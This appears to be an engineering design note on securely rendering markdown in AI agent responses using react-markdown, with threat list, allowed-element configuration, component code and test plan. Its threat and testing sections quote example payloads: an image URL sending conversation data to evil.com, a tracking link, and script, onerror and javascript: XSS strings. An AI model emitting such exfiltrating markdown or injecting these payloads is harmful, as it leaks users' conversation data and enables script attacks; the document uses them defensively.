# Secure Markdown Rendering for Agent Responses

## Problem Statement

Agent responses currently contain markdown formatting (e.g., `**bold**`, `*italic*`, code blocks) that is displayed as raw text. We want to render this markdown properly for better readability while maintaining strict security to prevent data exfiltration and XSS attacks.

## Security Threats to Mitigate

1. **Image Loading / Data Exfiltration**
   - Images make HTTP requests that could leak conversation data via URL parameters
   - Example: `![alt](https://evil.com/track?data=<sensitive-info>)`
   - **Mitigation**: Completely disable image rendering

2. **XSS Attacks**
   - Raw HTML in markdown could execute scripts
   - Example: `<script>alert('xss')</script>` or `<img onerror="alert('xss')">`
   - **Mitigation**: Disable HTML parsing entirely

3. **External Links / Tracking**
   - Links could be used for tracking or phishing
   - Example: `[click me](https://evil.com/track?user=<id>)`
   - **Mitigation**: Sanitize links, optionally disable or add warnings

4. **Resource Loading**
   - Other resources like iframes, videos, audio could make network requests
   - **Mitigation**: Disable all resource-loading elements

## Recommended Library: react-markdown

**react-markdown** is the most popular and well-maintained React markdown library:
- 12M+ weekly downloads on npm
- Actively maintained
- Built on `remark` (markdown parser) and `rehype` (HTML transformer)
- Highly configurable with component override system
- Security-focused by default (escapes HTML)

**Alternative considered**: marked + DOMPurify
- More manual setup required
- Less React-idiomatic
- Similar security profile when configured correctly

## Supported Markdown Features

### Safe to Enable ✅

1. **Text Formatting**
   - Bold: `**text**` or `__text__`
   - Italic: `*text*` or `_text_`
   - Strikethrough: `~~text~~`

2. **Code**
   - Inline code: `` `code` ``
   - Code blocks: ` ```language\ncode\n``` `
   - Syntax highlighting via `react-syntax-highlighter` (optional enhancement)

3. **Lists**
   - Unordered: `- item` or `* item`
   - Ordered: `1. item`
   - Nested lists

4. **Headings**
   - `# H1` through `###### H6`
   - Note: Agent responses rarely need headings, but safe to support

5. **Blockquotes**
   - `> quote text`

6. **Horizontal Rules**
   - `---` or `***`

7. **Line Breaks**
   - Preserve `\n` as line breaks

### Must Disable ❌

1. **Images**
   - `![alt](url)` - PRIMARY SECURITY CONCERN

2. **Raw HTML**
   - `<div>`, `<script>`, etc.

3. **Autolinks**
   - `<http://example.com>` - could be tracking links

4. **Links** (Optional - see Link Strategy below)
   - `[text](url)` - potential tracking/phishing

### Link Strategy Options

**Option A: Disable all links** (Most secure)
- Convert links to plain text or show URL without making it clickable
- Eliminates all link-based tracking

**Option B: Allow but sanitize** (Balanced)
- Only allow `http://` and `https://` protocols (block `javascript:`, `data:`, etc.)
- Add `rel="noopener noreferrer"` to prevent `window.opener` access
- Add visual indicator (external link icon)
- Optionally add click confirmation modal

**Option C: Allow internal links only** (If applicable)
- Only allow links to same domain
- Useful if agent references documentation

**Recommendation**: Start with Option A, add Option B if users request it.

## Implementation Plan

### Phase 1: Basic Setup

1. **Install dependencies**
   ```bash
   npm install react-markdown remark-gfm
   ```
   - `react-markdown`: Core markdown renderer
   - `remark-gfm`: GitHub Flavored Markdown (strikethrough, tables, task lists)

2. **Create MarkdownRenderer component** (`src/components/ui/MarkdownRenderer.tsx`)
   - Wrap react-markdown with security configuration
   - Disable all unsafe features
   - Apply Tailwind styling to markdown elements

3. **Configure allowed elements**
   ```tsx
   const allowedElements = [
     'p', 'br', 'strong', 'em', 'del',        // Text formatting
     'code', 'pre',                            // Code
     'ul', 'ol', 'li',                         // Lists
     'blockquote',                             // Quotes
     'h1', 'h2', 'h3', 'h4', 'h5', 'h6',     // Headings
     'hr',                                     // Horizontal rule
   ];
   // Explicitly exclude: a, img, input, iframe, video, audio, etc.
   ```

4. **Update AgentMessage component**
   - Replace `<p className="text-sm whitespace-pre-wrap">` with `<MarkdownRenderer>`
   - Pass `displayText` as children
   - Maintain streaming cursor functionality

### Phase 2: Styling

1. **Create Tailwind markdown styles**
   - Bold: `font-semibold`
   - Italic: `italic`
   - Code inline: `bg-gray-200 px-1.5 py-0.5 rounded text-xs font-mono`
   - Code blocks: `bg-gray-900 text-gray-100 p-3 rounded-lg overflow-x-auto font-mono text-xs`
   - Lists: Proper indentation and bullets
   - Headings: Size hierarchy (though likely rare in responses)

2. **Component overrides in react-markdown**
   ```tsx
   components={{
     code: ({ node, inline, className, children, ...props }) => {
       return inline ? (
         <code className="bg-gray-200 px-1.5 py-0.5 rounded text-xs font-mono">
           {children}
         </code>
       ) : (
         <pre className="bg-gray-900 text-gray-100 p-3 rounded-lg my-2">
           <code className="font-mono text-xs">{children}</code>
         </pre>
       );
     },
     // ... other component overrides
   }}
   ```

### Phase 3: Testing

1. **Security tests**
   - Verify images are not rendered: `![test](https://example.com/img.png)`
   - Verify HTML is escaped: `<script>alert(1)</script>`
   - Verify dangerous protocols blocked: `[click](javascript:alert(1))`
   - Test XSS payloads from OWASP cheat sheet

2. **Functionality tests**
   - Bold, italic, strikethrough render correctly
   - Inline code and code blocks render correctly
   - Lists (nested, ordered, unordered) render correctly
   - Line breaks preserved
   - Mixed markdown works: `**bold** and *italic* and `code``

3. **Performance tests**
   - Test with long agent responses (1000+ characters)
   - Test with streaming (markdown renders correctly as text arrives)
   - Verify no jank when switching between threads

### Phase 4: Enhanced Features (Optional)

1. **Syntax highlighting for code blocks**
   - Install `react-syntax-highlighter`
   - Auto-detect language from fence info (` ```typescript `)
   - Use lightweight theme that matches UI

2. **Copy button for code blocks**
   - Add copy-to-clipboard button on hover
   - Toast notification on copy

3. **Tables** (if needed)
   - GFM tables already supported via `remark-gfm`
   - Add responsive table styling

## Configuration Example

```tsx
// src/components/ui/MarkdownRenderer.tsx
import ReactMarkdown from 'react-markdown';
import remarkGfm from 'remark-gfm';

interface MarkdownRendererProps {
  children: string;
}

export function MarkdownRenderer({ children }: MarkdownRendererProps) {
  return (
    <ReactMarkdown
      remarkPlugins={[remarkGfm]}
      allowedElements={[
        'p', 'br', 'strong', 'em', 'del',
        'code', 'pre',
        'ul', 'ol', 'li',
        'blockquote',
        'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
        'hr',
      ]}
      unwrapDisallowed={true}
      components={{
        // Custom styling for each element
        strong: ({ children }) => (
          <strong className="font-semibold">{children}</strong>
        ),
        em: ({ children }) => (
          <em className="italic">{children}</em>
        ),
        code: ({ inline, children }) => {
          if (inline) {
            return (
              <code className="bg-gray-200 text-gray-800 px-1.5 py-0.5 rounded text-xs font-mono">
                {children}
              </code>
            );
          }
          return (
            <code className="block bg-gray-900 text-gray-100 p-3 rounded-lg my-2 overflow-x-auto font-mono text-xs">
              {children}
            </code>
          );
        },
        // ... more component overrides
      }}
    >
      {children}
    </ReactMarkdown>
  );
}
```

## Bundle Size Impact

- `react-markdown`: ~37 KB gzipped
- `remark-gfm`: ~4 KB gzipped
- Total: ~41 KB additional bundle size

This is acceptable for the functionality gained.

## Accessibility Considerations

1. **Semantic HTML**: react-markdown outputs proper semantic HTML
2. **Screen readers**: Formatted text will be announced correctly
3. **Keyboard navigation**: Code blocks should be scrollable with keyboard
4. **Color contrast**: Ensure code block colors meet WCAG AA standards

## Migration Strategy

1. Create `MarkdownRenderer` component with full security configuration
2. Add feature flag in `uiStore` (optional): `enableMarkdown: boolean`
3. Update `AgentMessage` to conditionally use markdown or plain text
4. Test thoroughly with various inputs
5. Enable by default once validated
6. Remove plain text fallback in future version

## Risks and Mitigations

| Risk | Mitigation |
|------|------------|
| New XSS vector discovered | Regular dependency updates, security audits |
| Malformed markdown crashes renderer | Error boundary around MarkdownRenderer |
| Performance regression | Memoize rendered output, virtualization already in place |
| Breaking changes in react-markdown | Pin major version, test before upgrading |

## Future Enhancements

1. **Math rendering** (if agent uses LaTeX)
   - Use `remark-math` + `rehype-katex`
   - Only if agents actually output math

2. **Mermaid diagrams** (if agent outputs diagrams)
   - Use `remark-mermaid`
   - Runs in sandboxed SVG, generally safe

3. **Custom components for tool calls**
   - Render tool calls with special markdown syntax
   - Example: ` ```tool:search\nquery\n``` ` → styled tool UI

## Success Metrics

1. **Security**: Zero XSS vulnerabilities, zero external requests from markdown
2. **Functionality**: All common markdown features render correctly
3. **Performance**: No measurable impact on message rendering (<5ms per message)
4. **User experience**: Improved readability for formatted agent responses

## References

- [react-markdown documentation](https://github.com/remarkjs/react-markdown)
- [remark-gfm documentation](https://github.com/remarkjs/remark-gfm)
- [OWASP Markdown XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
